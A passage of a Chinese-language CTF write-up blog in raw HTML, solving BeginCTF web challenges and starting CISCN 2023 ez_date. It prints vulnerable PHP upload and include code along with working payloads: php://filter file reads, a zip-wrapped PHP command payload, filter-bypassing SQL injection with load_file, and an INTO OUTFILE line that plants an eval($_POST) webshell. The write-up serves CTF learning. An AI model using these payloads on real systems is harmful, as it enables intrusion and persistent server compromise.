class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;action&#x27;</span>], <span class="hljs-string">&#x27;..&#x27;</span>) !== <span class="hljs-literal">false</span>) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;&lt;h1&gt;Invalid action&lt;/h1&gt;&#x27;</span>);<br>    &#125;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;action&#x27;</span>]));<br>&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REQUEST_METHOD&#x27;</span>] == <span class="hljs-string">&#x27;POST&#x27;</span>) &#123;<br>    <span class="hljs-variable">$file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br>    <span class="hljs-variable">$file_name</span> = <span class="hljs-variable">$file</span>[<span class="hljs-string">&#x27;name&#x27;</span>];<br>    <span class="hljs-variable">$file_tmp</span> = <span class="hljs-variable">$file</span>[<span class="hljs-string">&#x27;tmp_name&#x27;</span>];<br>    <span class="hljs-variable">$file_size</span> = <span class="hljs-variable">$file</span>[<span class="hljs-string">&#x27;size&#x27;</span>];<br>    <span class="hljs-variable">$file_error</span> = <span class="hljs-variable">$file</span>[<span class="hljs-string">&#x27;error&#x27;</span>];<br>    <br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$file_error</span> === <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$file_size</span> &lt;= <span class="hljs-number">2097152</span>) &#123;<br>            <span class="hljs-variable">$file_destination</span> = <span class="hljs-string">&#x27;uploads/&#x27;</span> . <span class="hljs-variable">$file_name</span>;<br><br>            <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$file_tmp</span>, <span class="hljs-variable">$file_destination</span>)) &#123;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">json_encode</span>(<span class="hljs-keyword">array</span>(<br>                    <span class="hljs-string">&#x27;status&#x27;</span> =&gt; <span class="hljs-string">&#x27;ok&#x27;</span>,<br>                    <span class="hljs-string">&#x27;message&#x27;</span> =&gt; <span class="hljs-string">&#x27;File uploaded successfully&#x27;</span>,<br>                    <span class="hljs-string">&#x27;url&#x27;</span> =&gt; <span class="hljs-title function_ invoke__">preg_split</span>(<span class="hljs-string">&#x27;/\?/&#x27;</span>, <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;HTTP_REFERER&#x27;</span>])[<span class="hljs-number">0</span>] . <span class="hljs-variable">$file_destination</span><br>                ));<br>            &#125;<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">json_encode</span>(<span class="hljs-keyword">array</span>(<br>            <span class="hljs-string">&#x27;status&#x27;</span> =&gt; <span class="hljs-string">&#x27;error&#x27;</span>,<br>            <span class="hljs-string">&#x27;message&#x27;</span> =&gt; <span class="hljs-string">&#x27;File upload failed&#x27;</span><br>        ));<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>通过：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span> (<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;action&#x27;</span>][<span class="hljs-number">0</span>] === <span class="hljs-string">&#x27;/&#x27;</span> || <span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;action&#x27;</span>], <span class="hljs-string">&#x27;..&#x27;</span>) !== <span class="hljs-literal">false</span>) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;&lt;h1&gt;Invalid action&lt;/h1&gt;&#x27;</span>);<br></code></pre></td></tr></table></figure><p>限制了之前的任意文件读取，想了想既然没限制伪协议，直接读<code>flag</code>去不就行吗：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/convert.base64-encode/</span>resource=/flag<br></code></pre></td></tr></table></figure><p><code>flag:begin&#123;lS_tHi5_A_wE6sHe11_aea289d3e362&#125;</code></p><h2 id="BeginCTF-zupload-pro-plus"><a href="#BeginCTF-zupload-pro-plus" class="headerlink" title="[BeginCTF]zupload-pro-plus"></a>[BeginCTF]zupload-pro-plus</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REQUEST_METHOD&#x27;</span>] == <span class="hljs-string">&#x27;GET&#x27;</span>) &#123;<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;action&#x27;</span>])) &#123;<br>        <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Location: /?action=upload&#x27;</span>);<br>        <span class="hljs-keyword">die</span>();<br>    &#125;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;action&#x27;</span>][<span class="hljs-number">0</span>] === <span class="hljs-string">&#x27;/&#x27;</span> || <span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;action&#x27;</span>], <span class="hljs-string">&#x27;..&#x27;</span>) !== <span class="hljs-literal">false</span>) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;&lt;h1&gt;Invalid action&lt;/h1&gt;&#x27;</span>);<br>    &#125;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;action&#x27;</span>]));<br>&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REQUEST_METHOD&#x27;</span>] == <span class="hljs-string">&#x27;POST&#x27;</span>) &#123;<br>    <span class="hljs-variable">$file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br>    <span class="hljs-variable">$file_name</span> = <span class="hljs-variable">$file</span>[<span class="hljs-string">&#x27;name&#x27;</span>];<br>    <span class="hljs-variable">$file_tmp</span> = <span class="hljs-variable">$file</span>[<span class="hljs-string">&#x27;tmp_name&#x27;</span>];<br>    <span class="hljs-variable">$file_size</span> = <span class="hljs-variable">$file</span>[<span class="hljs-string">&#x27;size&#x27;</span>];<br>    <span class="hljs-variable">$file_error</span> = <span class="hljs-variable">$file</span>[<span class="hljs-string">&#x27;error&#x27;</span>];<br>    <br>    <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">explode</span>(<span class="hljs-string">&#x27;.&#x27;</span>, <span class="hljs-variable">$file_name</span>);<br>    <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-variable">$file_ext</span>[<span class="hljs-number">1</span>]);<br>    <br>    <span class="hljs-variable">$allowed</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;zip&#x27;</span>);<br>    <br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$file_ext</span>, <span class="hljs-variable">$allowed</span>)) &#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$file_error</span> === <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-variable">$file_size</span> &lt;= <span class="hljs-number">2097152</span>) &#123;<br>                <span class="hljs-variable">$file_destination</span> = <span class="hljs-string">&#x27;uploads/&#x27;</span> . <span class="hljs-variable">$file_name</span>;<br>    <br>                <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$file_tmp</span>, <span class="hljs-variable">$file_destination</span>)) &#123;<br>                    <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">json_encode</span>(<span class="hljs-keyword">array</span>(<br>                        <span class="hljs-string">&#x27;status&#x27;</span> =&gt; <span class="hljs-string">&#x27;ok&#x27;</span>,<br>                        <span class="hljs-string">&#x27;message&#x27;</span> =&gt; <span class="hljs-string">&#x27;File uploaded successfully&#x27;</span>,<br>                        <span class="hljs-string">&#x27;url&#x27;</span> =&gt; <span class="hljs-title function_ invoke__">preg_split</span>(<span class="hljs-string">&#x27;/\?/&#x27;</span>, <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;HTTP_REFERER&#x27;</span>])[<span class="hljs-number">0</span>] . <span class="hljs-variable">$file_destination</span><br>                    ));<br>                &#125;<br>            &#125;<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">json_encode</span>(<span class="hljs-keyword">array</span>(<br>            <span class="hljs-string">&#x27;status&#x27;</span> =&gt; <span class="hljs-string">&#x27;error&#x27;</span>,<br>            <span class="hljs-string">&#x27;message&#x27;</span> =&gt; <span class="hljs-string">&#x27;Only zip files are allowed&#x27;</span><br>        ));<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>这次通过以下代码实现了对文件名的过滤：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">explode</span>(<span class="hljs-string">&#x27;.&#x27;</span>, <span class="hljs-variable">$file_name</span>);<br><span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-variable">$file_ext</span>[<span class="hljs-number">1</span>]);<br><br><span class="hljs-variable">$allowed</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;zip&#x27;</span>);<br><br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$file_ext</span>, <span class="hljs-variable">$allowed</span>)) &#123;<br></code></pre></td></tr></table></figure><p>这题我还是用的伪协议直接把<code>/flag</code>读出来了。。😂非预期了应该，不过懒得捣鼓其它方法了</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">?action=php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/convert.base64-encode/</span>resource=/flag<br></code></pre></td></tr></table></figure><p>flag:</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada"><span class="hljs-keyword">begin</span>&#123;s7rAnG3_5UFFIx_09f574e40d16&#125;<br></code></pre></td></tr></table></figure><h2 id="BeginCTF-zupload-pro-plus-max"><a href="#BeginCTF-zupload-pro-plus-max" class="headerlink" title="[BeginCTF]zupload-pro-plus-max"></a>[BeginCTF]zupload-pro-plus-max</h2><p><code>index.php:</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REQUEST_METHOD&#x27;</span>] == <span class="hljs-string">&#x27;GET&#x27;</span>) &#123;<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;action&#x27;</span>])) &#123;<br>        <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Location: /?action=upload&#x27;</span>);<br>        <span class="hljs-keyword">die</span>();<br>    &#125;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;action&#x27;</span>][<span class="hljs-number">0</span>] === <span class="hljs-string">&#x27;/&#x27;</span> || <span class="hljs-title function_ invoke__">substr_count</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;action&#x27;</span>], <span class="hljs-string">&#x27;/&#x27;</span>) &gt; <span class="hljs-number">1</span>) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;&lt;h1&gt;Invalid action&lt;/h1&gt;&#x27;</span>);<br>    &#125;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-keyword">include</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;action&#x27;</span>]));<br>&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REQUEST_METHOD&#x27;</span>] == <span class="hljs-string">&#x27;POST&#x27;</span>) &#123;<br>    <span class="hljs-variable">$file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br>    <span class="hljs-variable">$file_name</span> = <span class="hljs-variable">$file</span>[<span class="hljs-string">&#x27;name&#x27;</span>];<br>    <span class="hljs-variable">$file_tmp</span> = <span class="hljs-variable">$file</span>[<span class="hljs-string">&#x27;tmp_name&#x27;</span>];<br>    <span class="hljs-variable">$file_size</span> = <span class="hljs-variable">$file</span>[<span class="hljs-string">&#x27;size&#x27;</span>];<br>    <span class="hljs-variable">$file_error</span> = <span class="hljs-variable">$file</span>[<span class="hljs-string">&#x27;error&#x27;</span>];<br>    <br>    <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">explode</span>(<span class="hljs-string">&#x27;.&#x27;</span>, <span class="hljs-variable">$file_name</span>);<br>    <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-title function_ invoke__">end</span>(<span class="hljs-variable">$file_ext</span>));<br>    <br>    <span class="hljs-variable">$allowed</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;zip&#x27;</span>);<br>    <br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$file_ext</span>, <span class="hljs-variable">$allowed</span>) &amp;&amp; (<span class="hljs-keyword">new</span> <span class="hljs-title class_">ZipArchive</span>())-&gt;<span class="hljs-title function_ invoke__">open</span>(<span class="hljs-variable">$file_tmp</span>) === <span class="hljs-literal">true</span>) &#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$file_error</span> === <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-variable">$file_size</span> &lt;= <span class="hljs-number">2097152</span>) &#123;<br>                <span class="hljs-variable">$file_destination</span> = <span class="hljs-string">&#x27;uploads/&#x27;</span> . <span class="hljs-variable">$file_name</span>;<br>    <br>                <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$file_tmp</span>, <span class="hljs-variable">$file_destination</span>)) &#123;<br>                    <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">json_encode</span>(<span class="hljs-keyword">array</span>(<br>                        <span class="hljs-string">&#x27;status&#x27;</span> =&gt; <span class="hljs-string">&#x27;ok&#x27;</span>,<br>                        <span class="hljs-string">&#x27;message&#x27;</span> =&gt; <span class="hljs-string">&#x27;File uploaded successfully&#x27;</span>,<br>                        <span class="hljs-string">&#x27;url&#x27;</span> =&gt; <span class="hljs-title function_ invoke__">preg_split</span>(<span class="hljs-string">&#x27;/\?/&#x27;</span>, <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;HTTP_REFERER&#x27;</span>])[<span class="hljs-number">0</span>] . <span class="hljs-variable">$file_destination</span><br>                    ));<br>                &#125;<br>            &#125;<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">json_encode</span>(<span class="hljs-keyword">array</span>(<br>            <span class="hljs-string">&#x27;status&#x27;</span> =&gt; <span class="hljs-string">&#x27;error&#x27;</span>,<br>            <span class="hljs-string">&#x27;message&#x27;</span> =&gt; <span class="hljs-string">&#x27;Only zip files are allowed&#x27;</span><br>        ));<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>这回对<code>$_GET[&#39;action&#39;]</code>限制的更多了：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span> (<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;action&#x27;</span>][<span class="hljs-number">0</span>] === <span class="hljs-string">&#x27;/&#x27;</span> || <span class="hljs-title function_ invoke__">substr_count</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;action&#x27;</span>], <span class="hljs-string">&#x27;/&#x27;</span>) &gt; <span class="hljs-number">1</span>) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;&lt;h1&gt;Invalid action&lt;/h1&gt;&#x27;</span>);<br>    &#125;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-keyword">include</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;action&#x27;</span>]));<br></code></pre></td></tr></table></figure><p>值得注意的是这回用了<code>include</code>方法去包含<code>$_GET[&#39;action&#39;]</code>，<code>include</code>这东西不在意文件后缀是啥都当成php运行，所以：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//echo4.php，然后压缩成echo4.zip</span><br><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">eval</span>(<span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;cat /flag&#x27;</span>););<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>抓包可以看到即使是压缩文件，还是存在<code>&lt;?php eval(system(&#39;cat /flag&#39;));?&gt;</code>：</p><p><img src="/img/zuploadproplusmax.png" alt="zuploadproplusmax"></p><p>然后直接访问对应路径就好：</p><p><code>flag:begin&#123;evi1_Z1p_7d796747b39e&#125;</code></p><h2 id="BeginCTF-sql教学局"><a href="#BeginCTF-sql教学局" class="headerlink" title="[BeginCTF]sql教学局"></a>[BeginCTF]sql教学局</h2><p>flag被分成了三份</p><p>过滤了空格，<code>/**/</code>绕过。<code>select,or，from，load</code>这种直接双写绕过，过滤了<code>=</code>可以用<code>like</code>：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs sql">第一部分<br><span class="hljs-number">1</span><span class="hljs-string">&#x27;union/**/sselectelect/**/group_concat(column_name)/**/ffromrom/**/infoorrmation_schema.columns/**/where/**/table_name/**/like/**/&#x27;</span>passwoorrd<span class="hljs-string">&#x27;#</span><br><span class="hljs-string"></span><br><span class="hljs-string">结果：flag,id,note</span><br><span class="hljs-string"></span><br><span class="hljs-string">1&#x27;</span><span class="hljs-keyword">union</span><span class="hljs-comment">/**/</span>sselectelect<span class="hljs-comment">/**/</span>flag<span class="hljs-comment">/**/</span>ffromrom<span class="hljs-comment">/**/</span>secret.passwoorrd#<br><br>结果：flag&#123;<span class="hljs-number">795</span>b3b52<span class="hljs-operator">-</span><br><br>第二部分：<br><span class="hljs-number">1</span><span class="hljs-string">&#x27;union/**/sselectelect/**/group_concat(column_name)/**/ffromrom/**/infoorrmation_schema.columns/**/where/**/table_name/**/like/**/&#x27;</span>scoorre<span class="hljs-string">&#x27;#</span><br><span class="hljs-string"></span><br><span class="hljs-string">结果：grade,student</span><br><span class="hljs-string"></span><br><span class="hljs-string">1&#x27;</span><span class="hljs-keyword">union</span><span class="hljs-comment">/**/</span>sselectelect<span class="hljs-comment">/**/</span>grade<span class="hljs-comment">/**/</span>ffromrom<span class="hljs-comment">/**/</span>scoorre<span class="hljs-comment">/**/</span><span class="hljs-keyword">where</span><span class="hljs-comment">/**/</span>student<span class="hljs-comment">/**/</span><span class="hljs-keyword">like</span><span class="hljs-comment">/**/</span><span class="hljs-string">&#x27;begin&#x27;</span>#<br><br>结果：ae48<span class="hljs-number">-4851</span><span class="hljs-operator">-</span>be79<br></code></pre></td></tr></table></figure><p>第三部分提示<code>flag</code>在<code>/flag</code>下，一开始以为要写个马进去，试了试发现权限不够，load_file直接读就行：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27;/**/UNION/**/ALL/**/SselectELECT/**/lloadOAD_FILE(&#x27;</span><span class="hljs-operator">/</span>flag<span class="hljs-string">&#x27;)#</span><br><span class="hljs-string">结果：-d84e543816e6&#125;</span><br></code></pre></td></tr></table></figure><p>顺便记录下如果读写权限够的话，可以这么写东西进特定文件里：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27;/**/UNION/**/SselectELECT/**/0x3c3f706870206576616c28245f504f53545b2774657374275d293f3e/**/INTO/**/OUTFILE/**/&quot;/var/www/html/hello.php&quot;#</span><br></code></pre></td></tr></table></figure><h2 id="CISCN-2023-华北-ez-date"><a href="#CISCN-2023-华北-ez-date" class="headerlink" title="[CISCN 2023 华北]ez_date"></a>[CISCN 2023 华北]ez_date</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">date</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$b</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$file</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">is_array</span>(<span class="hljs-variable">$this</span>-&gt;a)||<span class="hljs-title function_ invoke__">is_array</span>(<span class="hljs-variable">$this</span>-&gt;b))&#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;no array&#x27;</span>);<br>        &#125;<br>        <span class="hljs-keyword">if</span>( (<span class="hljs-variable language_">$this</span>-&gt;a !== <span class="hljs-variable language_">$this</span>-&gt;b) &amp;&amp; (<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$this</span>-&gt;a) === <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$this</span>-&gt;b)) &amp;&amp; (<span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$this</span>-&gt;a)=== <span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$this</span>-&gt;b)) )&#123;<br>            <span class="hljs-variable">$content</span>=<span class="hljs-title function_ invoke__">date</span>(<span class="hljs-variable">$this</span>-&gt;file);<br>            <span class="hljs-variable">$uuid</span>=<span class="hljs-title function_ invoke__">uniqid</span>().<span class="hljs-string">&#x27;.txt&#x27;</span>;<br>            <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$uuid</span>,<span class="hljs-variable">$content</span>);<br>            <span class="hljs-variable">$data</span>=<span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/((\s)*(\n)+(\s)*)/i&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$uuid</span>));<br>            <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$data</span>);<br>        &#125;<br>        <span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">die</span>();<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;code&#x27;</span>])); <br></code></pre></td></tr></table></figure><p>class类中存在<code>__wakeup</code>方法：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php">&#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">is_array</span>(<span class="hljs-variable">$this</span>-&gt;a)||<span class="hljs-title function_ invoke__">is_array</span>(<span class="hljs-variable">$this</span>-&gt;b))&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;no array&#x27;</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span>( (<span class="hljs-variable language_">$this</span>-&gt;a !== <span class="hljs-variable language_">$this</span>-&gt;b) &amp;&amp; (<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$this</span>-&gt;a) === <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$this</span>-&gt;b)) &amp;&amp; (<span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$this</span>-&gt;a)=== <span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$this</span>-&gt;b)) )<br></code></pre></td></tr></table></figure><p>限制<code>a</code>和<code>b</code>不能为数组，然后就是比较经典的强等于。限制了数组的话可以用碰撞解题，但后面还连着一个<code>sha1</code>&#x3D;&#x3D;&#x3D;<code>sha1</code></p><p>强等于除了数组外存在如下方法：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span 